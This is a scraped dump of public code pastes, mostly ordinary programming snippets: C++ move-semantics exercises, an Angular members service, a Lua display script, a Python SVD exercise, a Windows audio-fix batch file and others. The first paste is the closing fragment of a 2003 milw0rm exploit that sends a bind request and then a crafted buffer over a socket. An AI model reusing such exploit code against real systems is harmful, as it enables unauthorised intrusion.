    *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+len-0xc;
    if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)
    {
            printf(""Send failed.Error:%d\n"",WSAGetLastError());
            return;
    }
    
    len=recv(sock,buf1,1000,NULL);
    if (send(sock,buf2,len1,0)==SOCKET_ERROR)
    {
            printf(""Send failed.Error:%d\n"",WSAGetLastError());
            return;
    }
//    len=recv(sock,buf1,1024,NULL);
}

/*

*/

// milw0rm.com [2003-09-20]
            "
YTHMBBQJ,Untitled,Driftix,Lua,Saturday 2nd of March 2024 03:39:13 AM CDT,"

local monitor = peripheral.find(""monitor"")

function display(message,x,y,speed)
    
    monitor.setTextScale(5)
    monitor.clear()
    monitor.setCursorPos(x,y)
    monitor.write(message)
    os.sleep(speed)
end

function displayText()
    if monitor then
        local message = ""Vive la démocratie""
        local speed = 0.1
        local width, height = monitor.getSize()
        local y = math.floor((height/2)-1)
        local x = width
        print(x)
        print(y)
        while x > -string.len(message) do
            display(message,x,y,speed)
            x = x - 1
        end
        displayText()
    else
        print(""Pas d'écran en sah"")
    end
end

displayText()"
JS6h7fwf,Untitled,nvrskadmin,Python,Saturday 2nd of March 2024 03:36:20 AM CDT,"import numpy as np
import matplotlib.pyplot as plt
# Скачивание картинки.
from PIL import Image, ImageOps
import requests

# Ссылка на картинку.
url = ""https://code.s3.yandex.net/math-adult/explanations/linal/1/svd/frog.jpeg""

# Скачивание и сохранение картинки в переменную.
im = ImageOps.grayscale(Image.open(requests.get(url, stream=True).raw))
# Превращение картинки в NumPy-массив.
frog = np.array(im).astype(float)


def show_image(img):
	plt.figure(figsize=(12, 8))
	plt.imshow(img, cmap='gray')
	plt.xticks([])
	plt.yticks([])

show_image(frog)

# Ваш код
U, s, VT = np.linalg.svd(frog, full_matrices=False)
S = np.diag(s)  # Превращаем вектор в диагональную матрицу.
k = 1
X_approx = U[:, 0:k] * S[0:k, 0:k] @ VT[0:k, :]
mass = round((X_approx.size * 8) / 1024 / 1024, 1)
print(mass)
# while mass < 1.2:
#     k += 1
#     X_approx = U[:, 0:k] @ S[0:k, 0:k] @ VT[0:k, :]
#     mass = round((X_approx.size * 8) / 1024 / 1024, 1)
#

show_image(X_approx)
plt.show()"
LKLG4arW,Untitled,35657,C++,Saturday 2nd of March 2024 03:36:06 AM CDT,"#include <iostream>

using namespace std;

class SimpleVector {

public:

	SimpleVector() : arr_(new int[10]), size_(10) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(int size) : arr_(new int[size]), size_(size) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(const SimpleVector& object) : arr_(new int[object.size_]), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
		cout << ""SimpleVector copy constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new int[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}

		cout << ""SimpleVector copy operator = for "" << size_ << "" elements, for "" << this << endl;
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
		cout << ""SimpleVector move constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}

		cout << ""SimpleVector move operator = for "" << size_ << "" elements, for "" << this << endl;
		return *this;
	}

	void print() const {
		for (int i = 0; i < 10; i++) {
			cout << arr_[i] << ' ';
		}
		cout << endl;
	}

	int& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	~SimpleVector() {
		delete[] arr_;
		cout << ""SimpleVector destructed for "" << size_ << "" elements, for "" << this << endl;;
	}

private:
	int* arr_;
	int size_;
};


//strating_point добавился чтобы был разнос начальных значений, иначе на одной и той же миллисекунду стартует
SimpleVector VectorFactory(int arrSize, int starting_point) {
	srand(time(NULL) + starting_point);
	SimpleVector vec(arrSize);
	for (int i = 0; i < arrSize; i++) {
		vec[i] = rand() % 10;
	}
	return vec;
}

int main() {
	SimpleVector arr[10]; // результирующая выборка
	int index = 0;
	for (int i = 0; i < 10; i++) {
		cout << endl << endl;
		SimpleVector vec;
		vec = VectorFactory(1000000, i); // считываем, парсим откуда-то большой объем информации
		vec.print(); // как-то его обрабатываем
		// здесь могут быть какие-то еще функции для обработки
		if (vec[0] % 2 == 0) { // если в итоге он удовлетворяет определенным условиям
			arr[index] = move(vec); // записываем его в результирующую выборку
			index++;
		}
	}
	cout << endl << endl;
	for (int i = 0; i < index; i++) { // выводим результат
		arr[i].print();
	}
}"
Cs3Dx3hj,Untitled,Abdula_2314124,C#,Saturday 2nd of March 2024 03:35:55 AM CDT,"using System;

namespace OOP_SecondPart
{
    public class Shifle : Gun
    {
        public bool aim;
        public override void Shoot()
        {
            CountPatron--;
            Console.WriteLine(""TuTu"");
        }
    }
}
"
HNm0hqPk,Untitled,35657,C++,Saturday 2nd of March 2024 03:35:20 AM CDT,"#include <iostream>

using namespace std;

class SimpleVector {

public:

	SimpleVector() : arr_(new int[10]), size_(10) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(int size) : arr_(new int[size]), size_(size) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(const SimpleVector& object) : arr_(new int[object.size_]), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
		cout << ""SimpleVector copy constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new int[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}

		cout << ""SimpleVector copy operator = for "" << size_ << "" elements, for "" << this << endl;
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
		cout << ""SimpleVector move constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}

		cout << ""SimpleVector move operator = for "" << size_ << "" elements, for "" << this << endl;
		return *this;
	}

	void print() const {
		for (int i = 0; i < 10; i++) {
			cout << arr_[i] << ' ';
		}
		cout << endl;
	}

	int& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	~SimpleVector() {
		delete[] arr_;
		cout << ""SimpleVector destructed for "" << size_ << "" elements, for "" << this << endl;;
	}

private:
	int* arr_;
	int size_;
};


//strating_point добавился тобы был разнос начальных значений, иначе на одной и той же миллисекунду стартует
SimpleVector VectorFactory(int arrSize, int starting_point) {
	srand(time(NULL) + starting_point);
	SimpleVector vec(arrSize);
	for (int i = 0; i < arrSize; i++) {
		vec[i] = rand() % 10;
	}
	return vec;
}

int main() {
	SimpleVector arr[10]; // результирующая выборка
	int index = 0;
	for (int i = 0; i < 10; i++) {
		cout << endl << endl;
		SimpleVector vec;
		vec = VectorFactory(1000000, i); // считываем, парсим откуда-то большой объем информации
		vec.print(); // как-то его обрабатываем
		// здесь могут быть какие-то еще функции для обработки
		if (vec[0] % 2 == 0) { // если в итоге он удовлетворяет определенным условиям
			arr[index] = vec; // записываем его в результирующую выборку
			index++;
		}
	}
	cout << endl << endl;
	for (int i = 0; i < index; i++) { // выводим результат
		arr[i].print();
	}
}"
wZM4tAqD,Untitled,35657,C++,Saturday 2nd of March 2024 03:34:49 AM CDT,"#include <iostream>

using namespace std;

class SimpleVector {

public:

	SimpleVector() : arr_(new int[10]), size_(10) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(int size) : arr_(new int[size]), size_(size) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(const SimpleVector& object) : arr_(new int[object.size_]), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
		cout << ""SimpleVector copy constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new int[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}

		cout << ""SimpleVector copy operator = for "" << size_ << "" elements, for "" << this << endl;
		return *this;
	}

	SimpleVector(SimpleVector&& object) : arr_(object.arr_), size_(object.size_) {
		object.arr_ = nullptr;
		object.size_ = 0;
		cout << ""SimpleVector move constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector& operator=(SimpleVector&& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = object.arr_;
			size_ = object.size_;
			object.arr_ = nullptr;
			object.size_ = 0;
		}

		cout << ""SimpleVector move operator = for "" << size_ << "" elements, for "" << this << endl;
		return *this;
	}

	void print() const {
		for (int i = 0; i < 10; i++) {
			cout << arr_[i] << ' ';
		}
		cout << endl;
	}

	int& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	~SimpleVector() {
		delete[] arr_;
		cout << ""SimpleVector destructed for "" << size_ << "" elements, for "" << this << endl;;
	}

private:
	int* arr_;
	int size_;
};


SimpleVector VectorFactory(int arrSize) {
	srand(time(NULL));
	SimpleVector vec(arrSize);
	for (int i = 0; i < arrSize; i++) {
		vec[i] = rand() % 10;
	}
	return vec;
}

int main() {
	SimpleVector vec1; // имеется какой-то вектор
	vec1 = VectorFactory(1000000); // записываем в него результат работы какой-то функции (копируем временный объект)
	std::cout << ""First 10 vec1 elements: "";
	vec1.print(); // выводим результат
}"
ByArpi7F,Untitled,Slavik9510,JavaScript,Saturday 2nd of March 2024 03:34:17 AM CDT,"//	memberservice.ts

import { HttpClient, HttpHeaders, HttpParams } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { environment } from 'src/environments/environment';
import { Member } from '../_models/member.model';
import { filter, map, of, take } from 'rxjs';
import { PaginatedResult } from '../_models/pagination';
import { UserParams } from '../_models/userParams';
import { AccountService } from './account.service';
import { User } from '../_models/user.model';

@Injectable({
  providedIn: 'root'
})
export class MembersService {
  baseUrl = environment.apiUrl;
  members: Member[] = [];
  memberCache = new Map();
  user: User | undefined;
  userParams: UserParams | undefined;

  constructor(private http: HttpClient, private accountService: AccountService) {
    this.accountService.currentUser$.pipe(
      filter(user => !!user),
      take(1)
    ).subscribe({
      next: user => {
        console.log(user);
        if (user) {
          this.userParams = new UserParams(user);
          this.user = user;
        }
      }
    })
  }

  getUserParams() {
    return this.userParams;
  }

  setUserParams(userParams: UserParams) {
    this.userParams = userParams;
  }

  resetUserParams() {
    if (this.user) {
      this.userParams = new UserParams(this.user);
      return this.userParams;
    }
    return;
  }

  getMembers(userParams: UserParams) {
    const response = this.memberCache.get(Object.values(userParams).join('-'));

    if (response) return of(response);

    let params = this.getPaginationHeaders(userParams.pageNumber, userParams.pageSize);

    params = params.append('minAge', userParams.minAge);
    params = params.append('maxAge', userParams.maxAge);
    params = params.append('gender', userParams.gender);
    params = params.append('orderBy', userParams.orderBy);

    return this.getPaginatedResult<Member[]>(this.baseUrl + 'users', params).pipe(
      map(response => {
        this.memberCache.set(Object.values(userParams).join('-'), response);
        return response;
      })
    );
  }

  getMember(username: string) {
    const member = [...this.memberCache.values()]
      .reduce((arr, elem) => arr.concat(elem.result), [])
      .find((member: Member) => member.username == username);

    if (member) {
      return of(member);
    }

    return this.http.get<Member>(this.baseUrl + 'users/' + username);
  }

  updateMember(member: Member) {
    return this.http.put(this.baseUrl + 'users', member);
  }

  setMainPhoto(photoId: number) {
    return this.http.put(this.baseUrl + 'users/set-main-photo/' + photoId, {})
  }

  deletePhoto(photoId: number) {
    return this.http.delete(this.baseUrl + 'users/delete-photo/' + photoId);
  }

  addLike(username: string) {
    return this.http.post(this.baseUrl + 'likes/' + username, {});
  }

  getLikes(predicate: string, pageNumber: number, pageSize: number) {
    let params = this.getPaginationHeaders(pageNumber, pageSize);

    params = params.append('predicate', predicate);

    return this.getPaginatedResult<Member[]>(this.baseUrl + 'likes', params);
  }

  private getPaginatedResult<T>(url: string, params: HttpParams) {
    const paginatedResult: PaginatedResult<T> = new PaginatedResult<T>;

    return this.http.get<T>(url, { observe: 'response', params }).pipe(
      map(response => {
        if (response.body) {
          paginatedResult.result = response.body;
        }
        const pagination = response.headers.get('Pagination');
        if (pagination) {
          paginatedResult.pagination = JSON.parse(pagination);
        }
        return paginatedResult;
      })
    );
  }

  private getPaginationHeaders(pageNumber: number, pageSize: number) {
    let params = new HttpParams();

    params = params.append('pageNumber', pageNumber);
    params = params.append('pageSize', pageSize);

    return params;
  }
}
//listComponent.html
<div class=""text-center mt-3"">
    <h2>{{predicate==='liked'?'Members I like':'Members who like me'}}</h2>
</div>

<div class=""container mt-3"">
    <div class=""d-flex"">
        <div class=""btn-group"" name=""predicate"">
            <button class=""btn btn-primary"" btnRadio=""liked"" [(ngModel)]=""predicate"" (click)=""loadLikes()"">Members I
                like</button>
            <button class=""btn btn-primary"" btnRadio=""likedBy"" [(ngModel)]=""predicate"" (click)=""loadLikes()"">Members who
                like me</button>
        </div>
    </div>

    <div class=""row mt-3"">
        <div class=""col-2"" *ngFor=""let member of members"">
            <app-member-card [member]=""member""></app-member-card>
        </div>
    </div>
</div>

<div class=""d-flex justify-content-center"" *ngIf=""pagination && pagination.totalItems>0;else no_result_message"">
    <pagination [boundaryLinks]=""true"" [totalItems]=""pagination.totalItems"" [itemsPerPage]=""pagination.itemsPerPage""
        [maxSize]=""10"" [(ngModel)]=""pagination.currentPage"" (pageChanged)=""pageChanged($event)"" previousText=""&lsaquo;""
        nextText=""&rsaquo;"" firstText=""&laquo;"" lastText=""&raquo;"">
    </pagination>
</div>

<ng-template #no_result_message>
    <div class=""container"">
        <p>Opps... There is nothing here</p>
    </div>
</ng-template>

//listcomponent.ts
import { Component, OnInit } from '@angular/core';
import { Member } from '../_models/member.model';
import { MembersService } from '../_services/members.service';
import { Pagination } from '../_models/pagination';

@Component({
  selector: 'app-lists',
  templateUrl: './lists.component.html',
  styleUrls: ['./lists.component.css']
})
export class ListsComponent implements OnInit {
  members: Member[] | undefined;
  predicate = 'liked';
  pageNumber = 1;
  pageSize = 5;
  pagination: Pagination | undefined;

  constructor(private memberService: MembersService) { }

  ngOnInit(): void {
    //this.loadLikes();
  }

  loadLikes() {
    this.memberService.getLikes(this.predicate, this.pageNumber, this.pageSize).subscribe({
      next: response => {
        this.members = response.result;
        this.pagination = response.pagination;
      }
    })
  }

  pageChanged(event: any) {
    if (this.pageNumber !== event.page) {
      this.pageNumber = event.page;
      this.loadLikes();
    }
  }
}

//membercard.html
<div class=""card mb-4"" *ngIf=""member"">
    <div class=""card-img-wrapper"">
        <img src=""{{member.photoUrl || './assets/user.png'}}"" alt=""{{member.knownAs}}"" class=""card-img-top"">
        <ul class=""list-inline member-icons animate text-center"">
            <li class=""list-inline-item"">
                <button routerLink=""/members/{{member.username}}"" class=""btn btn-primary""><i
                        class=""fa fa-user""></i></button>
            </li>
            <li class=""list-inline-item"">
                <button class=""btn btn-primary""><i class=""fa fa-heart""></i></button>
            </li>
            <li class=""list-inline-item"">
                <button class=""btn btn-primary""><i class=""fa fa-envelope""></i></button>
            </li>
        </ul>
    </div>
    <div class=""card-body p-1"">
        <h6 class=""card-title text-center mb-1"">
            <i class=""fa fa-user me-2""></i>
            {{member.knownAs}}, {{member.age}}
        </h6>
        <p class=""card-text text-muted text-center"">{{member.city}}</p>
    </div>
</div>

//member card .ts
import { Component, Input } from '@angular/core';
import { ToastrService } from 'ngx-toastr';
import { Member } from 'src/app/_models/member.model';
import { MembersService } from 'src/app/_services/members.service';

@Component({
  selector: 'app-member-card',
  templateUrl: './member-card.component.html',
  styleUrls: ['./member-card.component.css']
})
export class MemberCardComponent {
  @Input() member: Member | undefined;

  constructor(private memberService: MembersService, private toastr: ToastrService) { }

  addLike(member: Member) {
    this.memberService.addLike(member.username).subscribe({
      next: () => this.toastr.success('You have liked ' + member.knownAs)
    })
  }
}

//nav.component.ts
//import { Component, OnInit } from '@angular/core';
import { AccountService } from '../_services/account.service';
import { Router } from '@angular/router';
import { ToastrService } from 'ngx-toastr';
import { take } from 'rxjs';
import { MembersService } from '../_services/members.service';

@Component({
  selector: 'app-nav',
  templateUrl: './nav.component.html',
  styleUrls: ['./nav.component.css']
})
export class NavComponent implements OnInit {
  model: any = {}

  constructor(public accountService: AccountService, private router: Router, private toastr: ToastrService,
    private memberService: MembersService) { }

  ngOnInit(): void {
    this.accountService.currentUser$.pipe(take(1)).subscribe({
      //next: user => console.log(user)
    })
  }

  login() {
    this.accountService.login(this.model).subscribe({
      next: () => {
        this.router.navigateByUrl('/members');
      }
    })
  }

  logout() {
    this.accountService.logout();
    this.router.navigateByUrl('/');
  }
}

"
7TUbSK3q,Untitled,35657,C++,Saturday 2nd of March 2024 03:33:54 AM CDT,"#include <iostream>

using namespace std;

class SimpleVector {

public:

	SimpleVector() : arr_(new int[10]), size_(10) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(int size) : arr_(new int[size]), size_(size) {
		cout << ""SimpleVector constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector(const SimpleVector& object) : arr_(new int[object.size_]), size_(object.size_) {
		for (int i = 0; i < size_; i++) {
			arr_[i] = object.arr_[i];
		};
		cout << ""SimpleVector copy constructed for "" << size_ << "" elements, for "" << this << endl;
	}

	SimpleVector& operator=(const SimpleVector& object) {
		if (!(this == &object)) {
			delete[] arr_;
			arr_ = new int[object.size_];
			size_ = object.size_;
			for (int i = 0; i < size_; i++) {
				arr_[i] = object.arr_[i];
			}
		}

		cout << ""SimpleVector operator = for "" << size_ << "" elements, for "" << this << endl;
		return *this;
	}

	void print() const {
		for (int i = 0; i < 10; i++) {
			cout << arr_[i] << ' ';
		}
		cout << endl;
	}

	int& operator[] (int index) {
		if (index >= 0 && index < size_) {
			return arr_[index];
		}
	}

	~SimpleVector() {
		delete[] arr_;
		cout << ""SimpleVector destructed for "" << size_ << "" elements, for "" << this << endl;;
	}

private:
	int* arr_;
	int size_;
};


SimpleVector VectorFactory(int arrSize) {
	srand(time(NULL));
	SimpleVector vec(arrSize);
	for (int i = 0; i < arrSize; i++) {
		vec[i] = rand() % 10;
	}
	return vec;
}

int main() {
	SimpleVector vec1; // имеется какой-то вектор
	vec1 = VectorFactory(1000000); // записываем в него результат работы какой-то функции (копируем временный объект)
	std::cout << ""First 10 vec1 elements: "";
	vec1.print(); // выводим результат
}"
6wxMcCPB,Untitled,Abdula_2314124,C#,Saturday 2nd of March 2024 03:33:52 AM CDT,"namespace OOP_SecondPart
{
    public class Ak47 : Shifle
    {
        public bool isLongVersion;
    }
}
"
2v16UBVU,Untitled,Abdula_2314124,C#,Saturday 2nd of March 2024 03:33:03 AM CDT,"using System;
using System.Collections.Generic;
using System.Text;

namespace OOP_SecondPart
{
    public class Gun
    {
        // internal
        // internal protected

        // protected

        protected string Name;
        protected int CountPatron;
        public virtual void Shoot()
        {
            Console.WriteLine(""Paw!!!"");
        }

        public void Reload()
        {

        }
    }
}
"
tVxW1Kma,Untitled,Abdula_2314124,C#,Saturday 2nd of March 2024 03:32:23 AM CDT,"using System;

namespace OOP_SecondPart
{
    class Program
    {
        static void Main(string[] args)
        {
            Shifle ak_47 = new Shifle();
            Lazer lazer = new Lazer();
            Gun pistol = new Gun();
            
            pistol.Shoot();
            ak_47.Shoot();
            lazer.Shoot();
        }
    }
}
"
FMnxgXSD,BDFD - Remove Role,StaffVanish,Go,Saturday 2nd of March 2024 03:25:01 AM CDT,"$nomention
$if[$isSlash]$var[role;$findRole[$message[role]]]$var[user;$findUser[$message[user];no]]$else $var[role;$findRole[$message[1]]]$var[user;$findUser[$message[2];no]]$endif
$onlyBotPerms[manageroles;I don't have **Manage Roles** permissions!]
$onlyPerms[manageroles;You don't have **Manage Roles** permissions!]
$onlyIf[$message!=;Usage: `prefixremove @role @user`
Remove user role]
$onlyIf[$var[role]!=;$if[$message[1]!=]Role not found!$else Mention a role or put role ID/Name!$endif ]
$onlyIf[$var[user]!=;$if[$message[2]!=]User not found!$else Mention a user or put user ID/Name!$endif ]
$allowRoleMentions[$var[role]]
$allowUserMentions[$var[user]]
$onlyIf[$hasRole[$var[user];$var[role]]==false;<@$var[user]> doesn't have the role!]
$onlyIf[$rolePosition[$var[role]]<=$rolePosition[$highestRole[$botID]]];<@&$var[role]> position are $replaceText[$replaceText[$checkCondition[$rolePosition[$var[role]]==$rolePosition[$highestRole[$botID]]];true;same as];false;higher than] position highest bot role!]
$onlyIf[$rolePosition[$var[role]]<=$rolePosition[$highestRole[$authorID]]];<@&$var[role]> position are $replaceText[$replaceText[$checkCondition[$rolePosition[$var[role]]==$rolePosition[$highestRole[$authorID]]];true;same as];false;higher than] position highest your role!]
$botTyping $reply ✅ Removed <@&$var[role]> to <@$var[user]>
$takeRole[$var[user];$var[role]]"
V1AaiRvH,Untitled,ohwhatalovelyday,C++,Saturday 2nd of March 2024 03:21:10 AM CDT,"#include <bits/stdc++.h>

#define FASTER() ios_base::sync_with_stdio(false), cin.tie(NULL), cout.tie(NULL);
#define ff first
#define ss second
#define pb push_back
#define all(a) a.begin(), a.end()
#define dbg(x) cerr<<__LINE__<<"" ""<<#x<<"" ""<<x<<endl

typedef long long ll;

using namespace std;

struct position {
    int x, y, free;
};

int main() {
    FASTER();
    int n = 9;
    vector <vector <int>> mt(n, vector <int>(n));
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            char c;
            cin >> c;
            c == '.' ? mt[i][j] = -1 : mt[i][j] = c - '1'; //starts from 0
        }
    }
    vector <vector <int>> comps(n, vector <int>(n));
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            char c;
            cin >> c;
            comps[i][j] = c - '1';
        }
    }

    vector <vector <vector <int>>> cnt(n, vector <vector <int>>(n, vector <int>(n))); //для каждой точки - сколько чисел заняты
    vector <vector <int>> rows(n, vector <int>(n)); //для строки
    vector <vector <int>> cols(n, vector <int>(n)); //для столбца

    for(int i = 0; i < n; i++) { //идем по строкам и пишем для каждой строки все сущ-е цифры
        for(int j = 0; j < n; j++) {
            if(mt[i][j] != -1) {
                rows[i][mt[i][j]] = 1;
            }
        }
    }
    for(int j = 0; j < n; j++) {
        for(int i = 0; i < n; i++) {
            if(mt[i][j] != -1) {
                cols[j][mt[i][j]] = 1;
            }
        }
    }

    vector <position> pos; //заплоняем позиции
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            
        }
    }




}"
skw53hz5,Untitled,35657,C++,Saturday 2nd of March 2024 02:57:22 AM CDT,"
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <cstring>

using namespace std;

class Test {

public:

	Test(const int& value) : value_(value) {
		cout << ""parameterized constructor for "" << this << endl;
	}

	Test(const Test& other) : value_(other.value_) {
		cout << ""copy constructor for "" << this << endl;
	}

	Test& operator=(const Test& other) {
		if (this != &other) {
			value_ = other.value_;
		}
		cout << ""operator = for Test for "" << this << endl;
		return *this;
	}

	Test& operator=(const int& value) {
		value_ = value;
		cout << ""operator = for "" << this << endl;
		return *this;
	}


	friend ostream& operator<<(ostream& out, const Test& test);

private:

	int value_ = 1;

};

ostream& operator<<(ostream& out, const Test& test) {
	out << test.value_;
	return out;
}

int func(int x) {
	return x * 2;
}

int main() {

	Test a(3); // слева именованный(lvalue) объект, справа временный объект(rvalue) типа int (целочисленный литерал)

	Test b(2); // слева именованный(lvalue) объект, справа временный объект(rvalue) типа int

	a = 3; // слева именованный (lvalue) объект, справа временный объект (rvalue) типа int

	a = 3 + 4; // слева именованный (lvalue) объект, справа временный объект (rvalue) - результат выражения

	a = func(5); // слева именованный (lvalue) объект, справа временный объект (rvalue) - результат работы функции

	a = b; // слева и справа именованные (lvalue) объекты

	cout << a << endl;

	cout << b << endl;

}
"
mpNzK8nV,audio-fix.cmd,FadeMind,Winbatch,Saturday 2nd of March 2024 02:50:54 AM CDT,"@echo off
:: Check if we are an administrator. If not, exit immediately.
:: BatchGotAdmin
:: Check for permissions
if ""%PROCESSOR_ARCHITECTURE%"" equ ""amd64"" (
    >nul 2>&1 ""%SYSTEMROOT%\SysWOW64\cacls.exe"" ""%SYSTEMROOT%\SysWOW64\config\system""
) else (
    >nul 2>&1 ""%SYSTEMROOT%\system32\cacls.exe"" ""%SYSTEMROOT%\system32\config\system""
)

:: If the error flag set, we do not have admin rights.
if %ERRORLEVEL% neq 0 (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
echo Set UAC = CreateObject^(""Shell.Application""^) > ""%TEMP%\getadmin.vbs""
set params= %*
echo UAC.ShellExecute ""cmd.exe"", ""/c """"%~s0"""" %params:""=""""%"", """", ""runas"", 1 >> ""%TEMP%\getadmin.vbs""

wscript.exe ""%TEMP%\getadmin.vbs""
del ""%TEMP%\getadmin.vbs""
exit /b

:gotAdmin
cd /d ""%~dp0""

:audiofix
net stop RtkAudioUniversalService
net stop audiosrv
net start audiosrv
net start RtkAudioUniversalService"
v1nEVDCw,Untitled,35657,C++,Saturday 2nd of March 2024 02:48:45 AM CDT,"#include <iostream>

using namespace std;



int main() {
	int a = 0; // слева именованный объект (lvalue), справа неименованный (временный) объект типа - целочисленный литерал

	int b = 10 + a; // слева именованный объект (lvalue), справа неименованный (временный) объект - результат арифметического выражения

	a = 3; // слева именованный объект(lvalue), справа неименованный(временный) объект типа - целочисленный литерал

	a = b; // слева и справа lvalue объекты

	//3 = a; // временный (rvalue) объект не может быть слева

	char str[10] = ""hello""; // слева именованный объект (lvalue), справа неименованный объект - строковый литерал


}"
f5hJ46Ph,inaccurate sleep,AliAbdulKareem,C++,Saturday 2nd of March 2024 02:27:55 AM CDT,"	while(Run)	
	{

		FILETIME GameDllLastWrite = Win32GetFileTime(DLLSourcePath);
		if (CompareFileTime(&GameDllWriteTime, &GameDllLastWrite))
		{
			
			Win32UnloadCode(&Win32Code, DLLCopyPath);
			BOOL CopyResult = CopyFile(DLLSourcePath, DLLCopyPath, FALSE);
			if(!CopyResult)
			{

				Win32Code = Win32LoadCode(DLLCopyPath); // we got here after we unloaded the library yet we failed to copy to allow loading the new library
				goto EndCompareTime;
			}

			Win32Code = Win32LoadCode(DLLCopyPath);
			GameDllWriteTime = GameDllLastWrite;

			EndCompareTime:
			(void)0;
		}

		MSG Msg;
		while (PeekMessageA(&Msg, WindowHandle, 0, 0, PM_REMOVE))
		{
			UINT Message = Msg.message;
			switch (Message)
			{
			case WM_KEYUP:
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
			case WM_SYSKEYUP:
				{
					ProcessKeyboard(Message, Msg.wParam, Msg.lParam, &GameState);		
				} break;

			case WM_SIZE:
				{
					ProcessResize(WindowHandle, &BitMapInfo, &Win32Code, &GameState);
				} break;
			}

			TranslateMessage(&Msg);			
			DispatchMessage(&Msg);

		}

		Win32Code.GameUpdate(&GameState);
		Win32PresentBitMapToScreen(WindowHandle, DeviceContext, &BitMapInfo, GameState.BackBuffer);

		QueryPerformanceCounter(&EndingTime);
		u64 ElapsedMicroSeconds = EndingTime.QuadPart - StartingTime.QuadPart;

		ElapsedMicroSeconds *= 1000000;
		ElapsedMicroSeconds /= Frequency.QuadPart;


#if SLEEP_ON
		u64 FrameTimeInMicroSeconds = 16000;
		u64 SleepTime = FrameTimeInMicroSeconds - ElapsedMicroSeconds;  // this might wrap if we sleep for too long
		if (SleepTime > 0 && SleepTime < FrameTimeInMicroSeconds)
		{

			Sleep((DWORD)SleepTime/1000);

		}
#endif
		QueryPerformanceCounter(&EndingTime);
		u64 ElapsedMicrosecondsAfterSleep = EndingTime.QuadPart - StartingTime.QuadPart;
		ElapsedMicrosecondsAfterSleep *= 1000000;
		ElapsedMicrosecondsAfterSleep /= Frequency.QuadPart;

		StartingTime = EndingTime; // reset our starting time
#if DEBUG_PRINT_MS
		char Buffer[1024];
		wsprintf(Buffer, ""Elapsed Microseconds = %d \t| AfterSleep =%d \t| SleepTime = %d\n"", ElapsedMicroSeconds, (s32)ElapsedMicrosecondsAfterSleep, (s32)SleepTime);
		OutputDebugString(Buffer);
#endif
	}
"
eiC8QxRJ,pradan_budget.py,SherinKR,Python,Saturday 2nd of March 2024 02:10:11 AM CDT,"# Copyright (c) 2023, New Indictranstech and contributors
# For license information, please see license.txt

import frappe
import json
from pradan.pradan.utils import *
from frappe.utils import getdate, add_years, add_days
from frappe.model.document import Document

class PradanBudget(Document):
	def validate(self):
		if self.project:
			is_able_to_create_budget(self.project, 1)
		self.check_duplicate_projects()
		self.calculate_totals()
		self.validate_totals()

	def after_insert(self):
		self.set_initial_values()
		self.generate_allocation_rows()
		self.generate_staff_and_project_wise_salary()

	def before_submit(self):
		self.set_allocations()

	def on_update_after_submit(self):
		self.set_allocations()
		self.calculate_totals()
		self.validate_totals()

	def set_allocations(self):
		for row in self.allocations:
			budget_item_entry = create_or_update_budget_item_entry(row)
			if not row.budget_item_entry:
				row.budget_item_entry = budget_item_entry
